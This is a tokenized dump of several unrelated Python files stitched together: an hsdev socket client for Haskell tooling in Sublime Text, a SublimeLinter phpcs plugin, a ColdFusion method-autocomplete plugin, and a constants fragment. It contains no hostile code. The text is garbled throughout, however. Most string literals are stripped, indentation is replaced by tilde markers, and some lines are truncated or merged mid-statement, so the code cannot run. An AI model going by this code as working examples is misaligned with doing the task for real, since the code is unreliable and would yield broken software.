~~ def parse_correction ( d ) : \n 
~~~ return symbols . Correction ( \n 
d [ ] [ ] , \n 
d [ ] , \n 
d [ ] [ ] , \n 
parse_corrector ( d [ ] [ ] ) ) \n 
\n 
~~ def parse_corrector ( d ) : \n 
~~~ return symbols . Corrector ( \n 
parse_position ( d [ ] [ ] ) , \n 
parse_position ( d [ ] [ ] ) , \n 
d [ ] ) \n 
\n 
~~ def encode_corrections ( cs ) : \n 
~~~ return [ encode_correction ( c ) for c in cs ] \n 
\n 
~~ def encode_correction ( c ) : \n 
~~~ return { \n 
: { \n 
: None , \n 
: c . file } , \n 
: c . level , \n 
: { \n 
: encode_corrector ( c . corrector ) , \n 
: c . message } , \n 
: { \n 
: encode_position ( c . corrector . start . from_zero_based ( ) ) , \n 
: encode_position ( c . corrector . end . from_zero_based ( ) ) } \n 
} \n 
\n 
~~ def encode_corrector ( c ) : \n 
~~~ return { \n 
: { \n 
: encode_position ( c . start ) , \n 
: encode_position ( c . end ) } , \n 
: c . contents } \n 
\n 
~~ def encode_position ( p ) : \n 
~~~ return { \n 
: p . line , \n 
: p . column } \n 
\n 
~~ def encode_package_db ( db ) : \n 
~~~ if db . user_db : \n 
~~~ return \n 
~~ if db . global_db : \n 
~~~ return \n 
~~ if db . package_db : \n 
~~~ return { : db . package_db } \n 
~~ return None \n 
\n 
~~ def reconnect_function ( fn ) : \n 
~~~ def wrapped ( self , * args , ** kwargs ) : \n 
~~~ autoconnect_ = kwargs . pop ( , False ) \n 
on_reconnect_ = kwargs . pop ( , None ) \n 
just_connect_ = kwargs . pop ( , False ) \n 
def run_fn ( ) : \n 
~~~ if not just_connect_ : \n 
~~~ self . autoconnect = autoconnect_ \n 
self . on_reconnect = on_reconnect_ \n 
~~ return fn ( self , * args , ** kwargs ) \n 
~~ if not just_connect_ : \n 
~~~ self . set_reconnect_function ( run_fn ) \n 
~~ return run_fn ( ) \n 
~~ return wrapped \n 
\n 
~~ class begin_connecting ( object ) : \n 
~~~ def __init__ ( self , agent ) : \n 
~~~ self . agent = agent \n 
\n 
~~ def __enter__ ( self ) : \n 
~~~ self . agent . set_connecting ( ) \n 
return self \n 
\n 
~~ def __exit__ ( self , type , value , traceback ) : \n 
~~~ if type : \n 
~~~ self . agent . set_unconnected ( ) \n 
~~ else : \n 
~~~ if self . agent . is_connecting ( ) : \n 
~~~ self . agent . set_unconnected ( ) \n 
\n 
~~ ~~ ~~ ~~ def connect_function ( fn ) : \n 
~~~ def wrapped ( self , * args , ** kwargs ) : \n 
~~~ if self . is_unconnected ( ) : \n 
~~~ with begin_connecting ( self ) : \n 
~~~ return fn ( self , * args , ** kwargs ) \n 
~~ ~~ else : \n 
~~~ log ( , log_warning ) \n 
~~ ~~ return wrapped \n 
\n 
~~ def hsdev_command ( async = False , timeout = None , is_list = False ) : \n 
~~~ def wrap_function ( fn ) : \n 
~~~ def wrapped ( self , * args , ** kwargs ) : \n 
~~~ wait_flag = kwargs . pop ( , not async ) \n 
timeout_arg = kwargs . pop ( , timeout ) \n 
on_resp = kwargs . pop ( , None ) \n 
on_not = kwargs . pop ( , None ) \n 
on_err = kwargs . pop ( , None ) \n 
on_res_part = kwargs . pop ( , None ) \n 
split_res = kwargs . pop ( , on_res_part is not None ) \n 
\n 
( name_ , opts_ , on_result_ ) = fn ( self , * args , ** kwargs ) \n 
\n 
if is_list and split_res : \n 
~~~ result = [ ] \n 
def on_notify ( n ) : \n 
~~~ if in n : \n 
~~~ rp = on_result_ ( [ n [ ] ] ) [ 0 ] \n 
call_callback ( on_res_part , rp ) \n 
result . append ( rp ) \n 
~~ else : \n 
~~~ call_callback ( on_not , n ) \n 
~~ ~~ def on_response ( r ) : \n 
~~~ on_resp ( result ) \n 
\n 
~~ opts_ . update ( { : None } ) # FIXME: Is this option still used? \n 
r = self . call ( \n 
name_ , \n 
opts_ , \n 
on_response = on_response if on_resp else None , \n 
on_notify = on_notify , \n 
on_error = on_err , \n 
wait = wait_flag , \n 
timeout = timeout_arg ) \n 
if wait_flag : \n 
~~~ return result \n 
~~ return r \n 
\n 
~~ else : \n 
~~~ def on_response ( r ) : \n 
~~~ on_resp ( on_result_ ( r ) ) \n 
~~ r = self . call ( \n 
name_ , \n 
opts_ , \n 
on_response = on_response if on_resp else None , \n 
on_notify = on_not , \n 
on_error = on_err , \n 
wait = wait_flag , \n 
timeout = timeout_arg ) \n 
if wait_flag : \n 
~~~ return on_result_ ( r ) \n 
~~ return r \n 
~~ ~~ return wrapped \n 
~~ return wrap_function \n 
\n 
~~ def command ( fn ) : \n 
~~~ return hsdev_command ( async = False , timeout = 1 ) ( fn ) \n 
\n 
~~ def async_command ( fn ) : \n 
~~~ return hsdev_command ( async = True ) ( fn ) \n 
\n 
~~ def list_command ( fn ) : \n 
~~~ return hsdev_command ( async = False , timeout = 1 , is_list = True ) ( fn ) \n 
\n 
~~ def async_list_command ( fn ) : \n 
~~~ return hsdev_command ( async = True , is_list = True ) ( fn ) \n 
\n 
~~ def cmd ( name_ , opts_ = { } , on_result = lambda r : r ) : \n 
~~~ return ( name_ , opts_ , on_result ) \n 
\n 
~~ def call_callback ( fn , * args , ** kwargs ) : \n 
~~~ name = kwargs . get ( ) \n 
if name : \n 
~~~ del kwargs [ ] \n 
~~ try : \n 
~~~ if fn is not None : \n 
~~~ fn ( * args , ** kwargs ) \n 
~~ ~~ except Exception as e : \n 
~~~ log ( "callback \'{0}\' throws exception: {1}" . format ( name or , e ) ) \n 
\n 
~~ ~~ def format_error_details ( ds ) : \n 
~~~ return . join ( [ . format ( k , v ) for k , v in ds . items ( ) ] ) \n 
\n 
~~ class HsDevCallbacks ( object ) : \n 
~~~ def __init__ ( self , id , command , on_response = None , on_notify = None , on_error = None ) : \n 
~~~ self . id = id \n 
self . command = command \n 
self . start_time = time . clock ( ) \n 
self . on_response = on_response \n 
self . on_notify = on_notify \n 
self . on_error = on_error \n 
\n 
~~ def time ( self ) : \n 
~~~ return time . clock ( ) - self . start_time if self . start_time is not None else None \n 
\n 
~~ def log_time ( self ) : \n 
~~~ log ( . format ( self . command , self . time ( ) ) , log_trace ) \n 
\n 
~~ def call_response ( self , r ) : \n 
~~~ self . log_time ( ) \n 
call_callback ( self . on_response , r ) \n 
\n 
~~ def call_notify ( self , n ) : \n 
~~~ call_callback ( self . on_notify , n ) \n 
\n 
~~ def call_error ( self , e , ds ) : \n 
~~~ self . log_time ( ) \n 
log ( . format ( self . command , e , format_error_details ( ds ) ) , log_error call_callback ( self . on_error , e , ds ) \n 
\n 
\n 
~~ ~~ class HsDev ( object ) : \n 
~~~ def __init__ ( self , port = 4567 ) : \n 
~~~ self . port = port \n 
self . connecting = threading . Event ( ) \n 
self . connected = threading . Event ( ) \n 
self . socket = None \n 
self . listener = None \n 
self . hsdev_address = None \n 
self . autoconnect = True \n 
self . map = LockedObject ( { } ) \n 
self . id = 1 \n 
\n 
self . connect_fun = None \n 
\n 
self . part = \n 
\n 
self . on_connected = None \n 
self . on_disconnected = None \n 
self . on_reconnect = None \n 
\n 
~~ def __del__ ( self ) : \n 
~~~ self . close ( ) \n 
\n 
# Autoconnect \n 
~~ def set_reconnect_function ( self , f ) : \n 
~~~ if self . connect_fun is None : \n 
~~~ self . connect_fun = f \n 
\n 
~~ ~~ def reconnect ( self ) : \n 
~~~ if self . connect_fun is not None : \n 
~~~ log ( , log_info ) \n 
call_callback ( self . on_reconnect , name = ) \n 
self . connect_fun ( ) \n 
~~ else : \n 
~~~ log ( ) \n 
\n 
# Util \n 
\n 
~~ ~~ @ staticmethod \n 
def run_server ( port = 4567 , cache = None , log_file = None , log_config = None ) : \n 
~~~ cmd = concat_args ( [ \n 
( True , [ "hsdev" , "run" ] ) , \n 
( port , [ "--port" , str ( port ) ] ) , \n 
( cache , [ "--cache" , cache ] ) , \n 
( log_file , [ "--log" , log_file ] ) , \n 
( log_config , [ "--log-config" , log_config ] ) ] ) \n 
\n 
log ( , log_info ) \n 
p = call_and_wait ( cmd , wait = False ) \n 
if not p : \n 
~~~ log ( , log_error ) \n 
return None \n 
~~ while True : \n 
~~~ output = crlf2lf ( decode_bytes ( p . stdout . readline ( ) ) ) \n 
m = re . match ( , output ) \n 
if m : \n 
~~~ log ( . format ( m . group ( ) ) ) \n 
p . stdout . close ( ) \n 
p . stderr . close ( ) \n 
return p \n 
\n 
~~ ~~ ~~ @ staticmethod \n 
def start_server ( port = 4567 , cache = None , log_file = None , log_config = None ) : \n 
~~~ cmd = concat_args ( [ \n 
( True , [ "hsdev" , "start" ] ) , \n 
( port , [ "--port" , str ( port ) ] ) , \n 
( cache , [ "--cache" , cache ] ) , \n 
( log_file , [ "--log" , log_file ] ) , \n 
( log_config , [ "--log-config" , log_config ] ) ] ) \n 
\n 
def parse_response ( s ) : \n 
~~~ try : \n 
~~~ return { } if s . isspace ( ) else json . loads ( s ) \n 
~~ except Exception as e : \n 
~~~ return { : , : s } \n 
\n 
~~ ~~ log ( , log_info ) \n 
\n 
ret = call_and_wait_tool ( cmd , , , None , None , None , check_enabled = False ) \n 
if ret is not None : \n 
~~~ return ret \n 
~~ return None \n 
\n 
# Static creators \n 
\n 
~~ @ staticmethod \n 
def client ( port = 4567 , cache = None , autoconnect = False ) : \n 
~~~ start_server ( port = port , cache = cache ) \n 
h = HsDev ( port = port ) \n 
h . connect ( autoconnect = autoconnect ) \n 
return h \n 
\n 
~~ @ staticmethod \n 
def client_async ( port = 4567 , cache = None , autoconnect = False ) : \n 
~~~ start_server ( port = port , cache = cache ) \n 
h = HsDev ( port = port ) \n 
h . connect_async ( autoconnect = autoconnect ) \n 
return h \n 
\n 
# Socket functions \n 
\n 
~~ @ connect_function \n 
@ reconnect_function \n 
def connect ( self , tries = 10 , delay = 1.0 ) : \n 
~~~ self . socket = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
\n 
for n in range ( 0 , tries ) : \n 
~~~ try : \n 
~~~ log ( . format ( n ) , log_info ) \n 
self . socket . connect ( ( , self . port ) ) \n 
self . hsdev_socket = self . socket \n 
self . hsdev_address = \n 
self . set_connected ( ) \n 
self . listener = threading . Thread ( target = self . listen ) \n 
self . listener . start ( ) \n 
log ( , log_info ) \n 
call_callback ( self . on_connected , name = ) \n 
return True \n 
~~ except Exception as e : \n 
~~~ log ( . format ( n ) , log_warning ) \n 
time . sleep ( delay ) \n 
\n 
~~ ~~ return False \n 
\n 
~~ @ reconnect_function \n 
def connect_async ( self , tries = 10 , delay = 1.0 ) : \n 
~~~ thread = threading . Thread ( \n 
target = self . connect , \n 
kwargs = { : tries , : delay , : True } ) \n 
thread . start ( ) \n 
\n 
~~ def wait ( self , timeout = None ) : \n 
~~~ return self . connected . wait ( timeout ) \n 
\n 
~~ def close ( self ) : \n 
~~~ if self . is_unconnected ( ) : \n 
~~~ return \n 
~~ self . connected . clear ( ) \n 
if self . hsdev_socket : \n 
~~~ self . hsdev_socket . close ( ) \n 
self . hsdev_socket = None \n 
~~ self . socket . close ( ) \n 
\n 
~~ def is_connecting ( self ) : \n 
~~~ return self . connecting . is_set ( ) \n 
\n 
~~ def is_connected ( self ) : \n 
~~~ return self . connected . is_set ( ) \n 
\n 
~~ def is_unconnected ( self ) : \n 
~~~ return ( not self . is_connecting ( ) ) and ( not self . is_connected ( ) ) \n 
\n 
~~ def set_unconnected ( self ) : \n 
~~~ if self . connecting . is_set ( ) : \n 
~~~ self . connecting . clear ( ) \n 
~~ if self . connected . is_set ( ) : \n 
~~~ self . connected . clear ( ) \n 
\n 
~~ ~~ def set_connecting ( self ) : \n 
~~~ self . set_unconnected ( ) \n 
self . connecting . set ( ) \n 
\n 
~~ def set_connected ( self ) : \n 
~~~ if self . is_connecting ( ) : \n 
~~~ self . connected . set ( ) \n 
self . connecting . clear ( ) \n 
~~ else : \n 
~~~ log ( , log_debug ) \n 
\n 
~~ ~~ def on_receive ( self , id , command , on_response = None , on_notify = None , on_error = None ) : \n 
~~~ with self . map as m : \n 
~~~ m [ id ] = HsDevCallbacks ( id , command , on_response , on_notify , on_error ) \n 
\n 
~~ ~~ def verify_connected ( self ) : \n 
~~~ if self . is_connected ( ) : \n 
~~~ return True \n 
~~ else : \n 
~~~ self . connection_lost ( , ) \n 
return self . is_connected ( ) \n 
\n 
~~ ~~ def connection_lost ( self , fn , e ) : \n 
~~~ if self . is_unconnected ( ) : \n 
~~~ return \n 
~~ self . close ( ) \n 
log ( . format ( fn , e ) , log_error ) \n 
call_callback ( self . on_disconnected , name = ) \n 
\n 
# send error to callbacks \n 
with self . map as m : \n 
~~~ for on_msg in m . values ( ) : \n 
~~~ on_msg . on_error ( ) \n 
~~ m . clear ( ) \n 
\n 
~~ self . id = 1 \n 
self . part = \n 
\n 
if self . autoconnect : \n 
~~~ self . reconnect ( ) \n 
\n 
~~ ~~ def call ( self , command , opts = { } , on_response = None , on_notify = None , on_error = None , wait = # log \n 
~~~ args_cmd = . format ( command ) \n 
call_cmd = . format ( command , opts ) \n 
\n 
if not self . verify_connected ( ) : \n 
~~~ return None if wait else False \n 
\n 
~~ try : \n 
~~~ wait_receive = threading . Event ( ) if wait else None \n 
\n 
x = { } \n 
\n 
def on_response_ ( r ) : \n 
~~~ x [ ] = r \n 
call_callback ( on_response , r ) \n 
if wait_receive : \n 
~~~ wait_receive . set ( ) \n 
\n 
~~ ~~ def on_error_ ( e , ds ) : \n 
~~~ call_callback ( on_error , e , ds ) \n 
if wait_receive : \n 
~~~ wait_receive . set ( ) \n 
\n 
~~ ~~ if wait or on_response or on_notify or on_error : \n 
~~~ if id is None : \n 
~~~ id = str ( self . id ) \n 
self . id = self . id + 1 \n 
~~ self . on_receive ( id , args_cmd , on_response_ , on_notify , on_error_ ) \n 
\n 
~~ opts . update ( { : True } ) \n 
opts . update ( { : id , : command } ) \n 
msg = json . dumps ( opts , separators = ( , ) ) \n 
\n 
\n 
# So we just call it twice \n 
\n 
self . hsdev_socket . sendall ( msg . encode ( ) ) \n 
self . hsdev_socket . sendall ( . encode ( ) ) \n 
log ( call_cmd , log_trace ) \n 
\n 
if wait : \n 
~~~ wait_receive . wait ( timeout ) \n 
return x . get ( ) \n 
\n 
~~ return True \n 
~~ except Exception as e : \n 
~~~ log ( . format ( call_cmd , e ) , log_error ) \n 
self . connection_lost ( , e ) \n 
return False \n 
\n 
~~ ~~ def listen ( self ) : \n 
~~~ while self . verify_connected ( ) : \n 
~~~ try : \n 
~~~ resp = json . loads ( self . get_response ( ) ) \n 
if in resp : \n 
~~~ callbacks = None \n 
with self . map as m : \n 
~~~ if resp [ ] in m : \n 
~~~ callbacks = m [ resp [ ] ] \n 
~~ ~~ if callbacks : \n 
~~~ if in resp : \n 
~~~ callbacks . call_notify ( resp [ ] ) \n 
~~ if in resp : \n 
~~~ err = resp . pop ( "error" ) \n 
callbacks . call_error ( err , resp ) \n 
with self . map as m : \n 
~~~ m . pop ( resp [ ] ) \n 
~~ ~~ if in resp : \n 
~~~ callbacks . call_response ( resp [ ] ) \n 
with self . map as m : \n 
~~~ m . pop ( resp [ ] ) \n 
~~ ~~ ~~ ~~ ~~ except Exception as e : \n 
~~~ self . connection_lost ( , e ) \n 
return \n 
\n 
~~ ~~ ~~ def get_response ( self ) : \n 
~~~ while not in self . part : \n 
~~~ self . part = self . part + self . socket . recv ( 65536 ) . decode ( ) \n 
~~ ( r , _ , post ) = self . part . partition ( ) \n 
self . part = post \n 
return r \n 
\n 
# Commands \n 
\n 
~~ @ command \n 
def link ( self , hold = False , ** kwargs ) : \n 
~~~ return cmd ( , { \n 
: hold } ) \n 
\n 
~~ @ command \n 
def ping ( self ) : \n 
~~~ return cmd ( , { } , lambda r : r and ( in r ) and ( r [ ] == ) ) \n 
\n 
~~ @ async_command \n 
def scan ( self , cabal = False , sandboxes = [ ] , projects = [ ] , files = [ ] , paths = [ ] , ghc = [ ] , contents ~~~ return cmd ( , { \n 
: projects , \n 
: cabal , \n 
: sandboxes , \n 
: files , \n 
: paths , \n 
: [ { : f , : cts } for f , cts in contents . items ( ) ] , \n 
: ghc , \n 
: docs , \n 
: infer } ) \n 
\n 
~~ @ async_command \n 
def docs ( self , projects = [ ] , files = [ ] , modules = [ ] ) : \n 
~~~ return cmd ( , { \n 
: projects , \n 
: files , \n 
: modules } ) \n 
\n 
~~ @ async_command \n 
def infer ( self , projects = [ ] , files = [ ] , modules = [ ] ) : \n 
~~~ return cmd ( , { \n 
: projects , \n 
: files , \n 
: modules } ) \n 
\n 
~~ @ async_list_command \n 
def remove ( self , cabal = False , sandboxes = [ ] , projects = [ ] , files = [ ] , packages = [ ] ) : \n 
~~~ return cmd ( , { \n 
: projects , \n 
: cabal , \n 
: sandboxes , \n 
: files , \n 
: packages } ) \n 
\n 
~~ @ command \n 
def remove_all ( self ) : \n 
~~~ return cmd ( , { } ) \n 
\n 
~~ @ list_command \n 
def list_modules ( self , project = None , file = None , module = None , deps = None , sandbox = None , ~~~ fs = [ ] \n 
if project : \n 
~~~ fs . append ( { : project } ) \n 
~~ if file : \n 
~~~ fs . append ( { : file } ) \n 
~~ if module : \n 
~~~ fs . append ( { : module } ) \n 
~~ if deps : \n 
~~~ fs . append ( { : deps } ) \n 
~~ if sandbox : \n 
~~~ fs . append ( { : { : sandbox } } ) \n 
~~ if cabal : \n 
~~~ fs . append ( { : } ) \n 
~~ if db : \n 
~~~ fs . append ( { : encode_package_db ( db ) } ) \n 
~~ if package : \n 
~~~ fs . append ( { : package } ) \n 
~~ if source : \n 
~~~ fs . append ( ) \n 
~~ if standalone : \n 
~~~ fs . append ( ) \n 
\n 
~~ return cmd ( , { : fs } , parse_modules_brief ) \n 
\n 
~~ @ list_command \n 
def list_packages ( self ) : \n 
~~~ return cmd ( , { } ) \n 
\n 
~~ @ list_command \n 
def list_projects ( self ) : \n 
~~~ return cmd ( , { } ) \n 
\n 
~~ @ list_command \n 
def symbol ( self , input = "" , search_type = , project = None , file = None , module = None , # search_type is one of: exact, prefix, infix, suffix, regex \n 
~~~ q = { : input , : search_type } \n 
\n 
fs = [ ] \n 
if project : \n 
~~~ fs . append ( { : project } ) \n 
~~ if file : \n 
~~~ fs . append ( { : file } ) \n 
~~ if module : \n 
~~~ fs . append ( { : module } ) \n 
~~ if deps : \n 
~~~ fs . append ( { : deps } ) \n 
~~ if sandbox : \n 
~~~ fs . append ( { : { : sandbox } } ) \n 
~~ if cabal : \n 
~~~ fs . append ( { : } ) \n 
~~ if db : \n 
~~~ fs . append ( { : encode_package_db ( db ) } ) \n 
~~ if package : \n 
~~~ fs . append ( { : package } ) \n 
~~ if source : \n 
~~~ fs . append ( ) \n 
~~ if standalone : \n 
~~~ fs . append ( ) \n 
\n 
~~ return cmd ( , { : q , : fs , : locals } , parse_decls ) \n 
\n 
~~ @ command \n 
def module ( self , input = "" , search_type = , project = None , file = None , module = None , ~~~ q = { : input , : search_type } \n 
\n 
fs = [ ] \n 
if project : \n 
~~~ fs . append ( { : project } ) \n 
~~ if file : \n 
~~~ fs . append ( { : file } ) \n 
~~ if module : \n 
~~~ fs . append ( { : module } ) \n 
~~ if deps : \n 
~~~ fs . append ( { : deps } ) \n 
~~ if sandbox : \n 
~~~ fs . append ( { : { : sandbox } } ) \n 
~~ if cabal : \n 
~~~ fs . append ( { : } ) \n 
~~ if db : \n 
~~~ fs . append ( { : encode_package_db ( db ) } ) \n 
~~ if package : \n 
~~~ fs . append ( { : package } ) \n 
~~ if source : \n 
~~~ fs . append ( ) \n 
~~ if standalone : \n 
~~~ fs . append ( ) \n 
\n 
~~ return cmd ( , { : q , : fs } , parse_modules ) \n 
\n 
~~ @ command \n 
def resolve ( self , file , exports = False ) : \n 
~~~ return cmd ( , { : file , : exports } , parse_module ) \n 
\n 
~~ @ command \n 
def project ( self , project = None , path = None ) : \n 
~~~ return cmd ( , { : project } if project else { : path } ) \n 
\n 
~~ @ command \n 
def sandbox ( self , path ) : \n 
~~~ return cmd ( , { : path } ) \n 
\n 
~~ @ list_command \n 
def lookup ( self , name , file ) : \n 
~~~ return cmd ( , { : name , : file } , parse_decls ) \n 
\n 
~~ @ list_command \n 
def whois ( self , name , file ) : \n 
~~~ return cmd ( , { : name , : file } , parse_declarations ) \n 
\n 
~~ @ list_command \n 
def scope_modules ( self , file , input = , search_type = ) : \n 
~~~ return cmd ( , { : { : input , : search_type } , : file } , \n 
~~ @ list_command \n 
def scope ( self , file , input = , search_type = , global_scope = False ) : \n 
~~~ return cmd ( , { : { : input , : search_type } , : global_scope , \n 
~~ @ list_command \n 
def complete ( self , input , file , wide = False ) : \n 
~~~ return cmd ( , { : input , : wide , : file } , parse_declarations ) \n 
\n 
~~ @ list_command \n 
def hayoo ( self , query , page = None , pages = None ) : \n 
~~~ return cmd ( , { : query , : page or 0 , : pages or 1 } , parse_decls ) \n 
\n 
~~ @ list_command \n 
def cabal_list ( self , packages ) : \n 
~~~ cmd ( , { : packages } , lambda r : [ parse_cabal_package ( s ) for s in r ] if r \n 
~~ @ list_command \n 
def lint ( self , files = [ ] , contents = { } , hlint = [ ] ) : \n 
~~~ return cmd ( , { \n 
: files , \n 
: [ { : f , : cts } for f , cts in contents . items ( ) ] , \n 
: hlint } ) \n 
\n 
~~ @ list_command \n 
def check ( self , files = [ ] , contents = { } , ghc = [ ] ) : \n 
~~~ return cmd ( , { \n 
: files , \n 
: [ { : f , : cts } for f , cts in contents . items ( ) ] , \n 
: ghc } ) \n 
\n 
~~ @ list_command \n 
def check_lint ( self , files = [ ] , contents = { } , ghc = [ ] , hlint = [ ] ) : \n 
~~~ return cmd ( , { \n 
: files , \n 
: [ { : f , : cts } for f , cts in contents . items ( ) ] , \n 
: ghc , \n 
: hlint } ) \n 
\n 
~~ @ list_command \n 
def types ( self , files = [ ] , contents = { } , ghc = [ ] ) : \n 
~~~ return cmd ( , { \n 
: files , \n 
: [ { : f , : cts } for f , cts in contents . items ( ) ] , \n 
: ghc } ) \n 
\n 
~~ @ command \n 
def ghcmod_lang ( self ) : \n 
~~~ return cmd ( ) \n 
\n 
~~ @ command \n 
def ghcmod_flags ( self ) : \n 
~~~ return cmd ( ) \n 
\n 
~~ @ list_command \n 
def ghcmod_type ( self , file , line , column = 1 , ghc = [ ] ) : \n 
~~~ return cmd ( , { \n 
: { : int ( line ) , : int ( column ) } , \n 
: file , \n 
: ghc } ) \n 
\n 
~~ @ list_command \n 
def ghcmod_check ( self , files , ghc = [ ] ) : \n 
~~~ return cmd ( , { : files , : ghc } ) \n 
\n 
~~ @ list_command \n 
def ghcmod_lint ( self , files , hlint = [ ] ) : \n 
~~~ return cmd ( , { : files , : hlint } ) \n 
\n 
~~ @ list_command \n 
def ghcmod_check_lint ( self , files , ghc = [ ] , hlint = [ ] ) : \n 
~~~ return cmd ( , { : files , : ghc , : hlint } ) \n 
\n 
~~ @ list_command \n 
def autofix_show ( self , messages ) : \n 
~~~ return cmd ( , { : messages } , parse_corrections ) \n 
\n 
~~ @ list_command \n 
def autofix_fix ( self , messages , rest = [ ] , pure = False ) : \n 
~~~ return cmd ( , { : messages , : rest , : pure } , parse_corrections \n 
~~ @ list_command \n 
def ghc_eval ( self , exprs ) : \n 
~~~ return cmd ( , { : exprs } ) \n 
\n 
~~ @ command \n 
def exit ( self ) : \n 
~~~ return cmd ( , { } ) \n 
\n 
~~ ~~ def wait_result ( fn , * args , ** kwargs ) : \n 
~~~ wait_receive = threading . Event ( ) \n 
x = { : None } \n 
\n 
on_resp = kwargs . get ( ) \n 
on_err = kwargs . get ( ) \n 
\n 
def wait_response ( r ) : \n 
~~~ x [ ] = r \n 
if on_resp : \n 
~~~ on_resp ( r ) \n 
~~ wait_receive . set ( ) \n 
~~ def wait_error ( e , ds ) : \n 
~~~ log ( . format ( e , format_error_details ( ds ) ) ) \n 
if on_err : \n 
~~~ on_err ( e , ds ) \n 
~~ wait_receive . set ( ) \n 
\n 
~~ tm = kwargs . pop ( , 0.1 ) \n 
\n 
kwargs [ ] = wait_response \n 
kwargs [ ] = wait_error \n 
\n 
fn ( * args , ** kwargs ) \n 
\n 
wait_receive . wait ( tm ) \n 
return x [ ] \n 
\n 
~~ class HsDevProcess ( threading . Thread ) : \n 
~~~ def __init__ ( self , port = 4567 , cache = None , log_file = None , log_config = None ) : \n 
~~~ super ( HsDevProcess , self ) . __init__ ( ) \n 
self . process = None \n 
self . on_start = None \n 
self . on_exit = None \n 
self . stop_event = threading . Event ( ) \n 
self . create_event = threading . Event ( ) \n 
self . port = port \n 
self . cache = cache \n 
self . log_file = log_file \n 
self . log_config = log_config \n 
\n 
~~ def run ( self ) : \n 
~~~ while True : \n 
~~~ self . create_event . wait ( ) \n 
self . create_event . clear ( ) \n 
while not self . stop_event . is_set ( ) : \n 
~~~ self . process = HsDev . run_server ( port = self . port , cache = self . cache , log_file = self if not self . process : \n 
~~~ log ( , log_error ) \n 
self . stop_event . set ( ) \n 
~~ else : \n 
~~~ call_callback ( self . on_start , name = ) \n 
~~ self . process . wait ( ) \n 
call_callback ( self . on_exit , name = ) \n 
~~ self . stop_event . clear ( ) \n 
\n 
~~ ~~ def active ( self ) : \n 
~~~ return self . process . poll ( ) is None \n 
\n 
~~ def inactive ( self ) : \n 
~~~ return self . process . poll ( ) is not None \n 
\n 
~~ def create ( self ) : \n 
~~~ self . create_event . set ( ) \n 
\n 
~~ def stop ( self ) : \n 
~~~ self . stop_event . set ( ) \n 
# \n 
# linter.py \n 
# Linter for SublimeLinter3, a code checking framework for Sublime Text 3 \n 
# \n 
# Written by Dmitry Tsoy \n 
# Copyright (c) 2013 Dmitry Tsoy \n 
# \n 
# License: MIT \n 
# \n 
\n 
~~ ~~ """This module exports the Phpcs plugin class.""" \n 
\n 
from SublimeLinter . lint import Linter \n 
\n 
\n 
class Phpcs ( Linter ) : \n 
~~~ """Provides an interface to phpcs.""" \n 
\n 
syntax = ( , , ) \n 
regex = ( \n 
r\'.*line="(?P<line>\\d+)" \' \n 
r\'column="(?P<col>\\d+)" \' \n 
r\'severity="(?:(?P<error>error)|(?P<warning>warning))" \' \n 
r\'message="(?P<message>.*)" source\' \n 
) \n 
executable = \n 
defaults = { \n 
: , \n 
} \n 
inline_overrides = ( ) \n 
tempfile_suffix = \n 
\n 
def cmd ( self ) : \n 
~~~ """Read cmd from inline settings.""" \n 
settings = Linter . get_view_settings ( self ) \n 
\n 
if in settings : \n 
~~~ command = [ settings . get ( ) ] \n 
~~ else : \n 
~~~ command = [ self . executable_path ] \n 
\n 
~~ command . append ( ) \n 
\n 
return command \n 
~~ ~~ import sublime \n 
import sublime_plugin \n 
import re , os \n 
\n 
completions = [ ] \n 
SETTINGS = sublime . load_settings ( ) \n 
\n 
# props to @boundincode for imoplemntation \n 
def add_methods ( cfc_file , hint_text ) : \n 
~~~ with open ( cfc_file , ) as f : \n 
~~~ read_data = f . read ( ) \n 
~~ methods = [ ] \n 
method_lines = re . findall ( , read_data ) \n 
\n 
for l in method_lines : \n 
~~~ l = re . sub ( "[\\\\n|\\s]+" , " " , l ) \n 
s = re . search ( , l ) \n 
if s : \n 
~~~ methods . append ( s . group ( ) . strip ( ) ) \n 
\n 
~~ ~~ for c in methods : \n 
~~~ snippet = c \n 
params = re . sub ( "\\w+\\(" , "" , snippet , 1 ) [ : - 1 ] . split ( "," ) \n 
\n 
num = 1 \n 
if len ( params [ 0 ] ) : \n 
~~~ for p in params : \n 
~~~ snippet = snippet . replace ( p , + str ( num ) + + p + ) \n 
num = num + 1 \n 
# removes parens \n 
~~ ~~ c = re . sub ( "\\(.*\\)" , "" , c ) \n 
completions . append ( ( c + "\\tfn. " + hint_text , snippet ) ) \n 
\n 
\n 
~~ ~~ class MethodsAutoComplete ( sublime_plugin . EventListener ) : \n 
~~~ def on_query_completions ( self , view , prefix , locations ) : \n 
~~~ if not view . match_selector ( locations [ 0 ] , \n 
"source.cfscript.cfc - text - meta - string - comment" ) : \n 
~~~ return [ ] \n 
\n 
~~ if not SETTINGS . get ( "component_method_completions" ) : \n 
~~~ return \n 
\n 
# set local _completions variable \n 
~~ _completions = [ ] \n 
\n 
\n 
try : \n 
~~~ cfc_region = view . find_by_selector ( "meta.component-operator.extends.value.cfscript" ) [ 0 ] \n 
~~ except IndexError : \n 
~~~ cfc_region = "" \n 
\n 
~~ if len ( cfc_region ) : \n 
~~~ extendspath = view . substr ( cfc_region ) . replace ( "." , "/" ) \n 
\n 
# first check the current directory for nested cfc path \n 
# get the dir this file is in first \n 
this_file = view . file_name ( ) \n 
dir_len = this_file . rfind ( ) #(for OSX) \n 
if not dir_len > 0 : \n 
~~~ dir_len = this_file . rfind ( ) #(for Windows) \n 
~~ this_dir = this_file [ : ( dir_len + 1 ) ] \n 
\n 
cfc_file = this_dir + extendspath + ".cfc" \n 
if not os . path . isfile ( cfc_file ) : \n 
# check for the cfc in root folders \n 
~~~ for folder in sublime . active_window ( ) . folders ( ) : \n 
~~~ if os . path . isfile ( folder + "/" + extendspath + ".cfc" ) : \n 
~~~ cfc_file = folder + "/" + extendspath + ".cfc" \n 
break \n 
~~ ~~ ~~ try : \n 
~~~ add_methods ( cfc_file , view . substr ( cfc_region ) . split ( "." ) [ - 1 ] ) \n 
~~ except UnboundLocalError : \n 
~~~ pass \n 
~~ except IOError : \n 
~~~ pass \n 
\n 
# add this files methods to autocomplete \n 
~~ ~~ add_methods ( view . file_name ( ) , "this" ) \n 
\n 
# add the completions to the local _completions variable \n 
_completions . extend ( completions ) \n 
\n 
# prevents dups \n 
del completions [ : ] \n 
return _completions \n 
~~ ~~ import os \n 
\n 
import sublime \n 
\n 
\n 
CMD_TARGET_APPLICATION = 0 \n 
CMD_TARGET_WINDOW = 1 \n 
CMD_TARGET_VIEW = 2 \n 
\n 
CMD_RUN = \n 
CMD_KEY = \n 
